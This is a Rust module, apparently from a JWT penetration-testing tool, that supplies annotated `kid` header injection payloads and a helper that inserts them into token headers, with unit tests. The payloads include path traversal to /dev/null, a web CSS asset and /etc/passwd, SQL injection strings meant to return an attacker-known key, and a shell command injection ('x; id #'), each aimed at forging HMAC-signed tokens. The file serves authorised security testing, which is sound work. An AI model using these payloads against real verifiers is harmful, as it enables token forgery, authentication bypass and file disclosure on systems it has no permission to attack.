//! `kid` header injection templates.
//!
//! Real-world impact: many libraries use the `kid` header to look up keys
//! from a database, key directory, or shell-out script. If that lookup is
//! unsanitized, the `kid` becomes a vector for SQL injection, command
//! injection, or path traversal — and the attacker often gets the verifier
//! to read arbitrary files (which then get hashed as the HMAC key, allowing
//! signature forgery against any file with predictable content).
//!
//! This module produces *templates* — annotated examples to be wired into
//! a forged token by the caller (typically through the `attack kid`
//! subcommand). It does not, by itself, exfiltrate data.

use serde::Serialize;

/// A single annotated template.
#[derive(Debug, Clone, Serialize)]
pub struct KidTemplate {
    /// Short identifier shown in the UI.
    pub label: &'static str,
    /// Vulnerability class.
    pub class: &'static str,
    /// The string to drop into the `kid` header.
    pub kid: &'static str,
    /// One-line note about what the verifier is expected to do with this
    /// payload, and how a defender should respond.
    pub explanation: &'static str,
}

/// Curated `kid` payloads covering the four most common verifier mistakes.
pub const TEMPLATES: &[KidTemplate] = &[
    KidTemplate {
        label: "path-traversal-devnull",
        class: "Path traversal",
        kid: "../../../../../../dev/null",
        explanation: "If the verifier reads a file named after `kid`, /dev/null returns empty \
                      bytes — HMAC-with-empty-key forgery follows. Defenders must allowlist \
                      `kid` values.",
    },
    KidTemplate {
        label: "path-traversal-css",
        class: "Path traversal",
        kid: "../../../../../var/www/static/style.css",
        explanation: "Tricks the verifier into using a public CSS asset as the HMAC key. The \
                      attacker knows the file contents, so they can sign at will.",
    },
    KidTemplate {
        label: "sqli-union-select",
        class: "SQL injection",
        kid: "x' UNION SELECT 'attacker_known_secret",
        explanation: "Verifier interpolates `kid` into a SQL query. Returning attacker-known \
                      bytes lets them forge tokens. Defenders must use parameterized queries.",
    },
    KidTemplate {
        label: "sqli-comment-bypass",
        class: "SQL injection",
        kid: "x'-- ",
        explanation: "Comments out the rest of the lookup query, often returning the first \
                      row as the key.",
    },
    KidTemplate {
        label: "command-injection",
        class: "Command injection",
        kid: "x; id #",
        explanation: "Verifier shells out to a key-fetch script. Output of `id` becomes the \
                      HMAC key. Defenders must never pass `kid` to a shell.",
    },
    KidTemplate {
        label: "null-byte-truncate",
        class: "Path traversal",
        kid: "valid_kid\u{0}/etc/passwd",
        explanation: "Old C-binding bug: NUL byte truncates the filename, redirecting the \
                      file read to /etc/passwd while keeping a benign-looking prefix.",
    },
];

/// Insert a fully-formed `kid` value into a decoded header object and re-emit
/// the token unsigned (the caller is expected to wire up signing separately).
pub fn render_header_with_kid(header: &serde_json::Value, kid: &str) -> serde_json::Value {
    let mut h = header.clone();
    if let Some(map) = h.as_object_mut() {
        map.insert("kid".into(), serde_json::Value::String(kid.to_owned()));
    }
    h
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn templates_cover_each_class() {
        let classes: std::collections::BTreeSet<&str> = TEMPLATES.iter().map(|t| t.class).collect();
        assert!(classes.contains("Path traversal"));
        assert!(classes.contains("SQL injection"));
        assert!(classes.contains("Command injection"));
    }

    #[test]
    fn render_inserts_kid() {
        let h = serde_json::json!({"alg": "HS256"});
        let rendered = render_header_with_kid(&h, "../etc/passwd");
        assert_eq!(rendered["kid"], "../etc/passwd");
        assert_eq!(rendered["alg"], "HS256");
    }
}
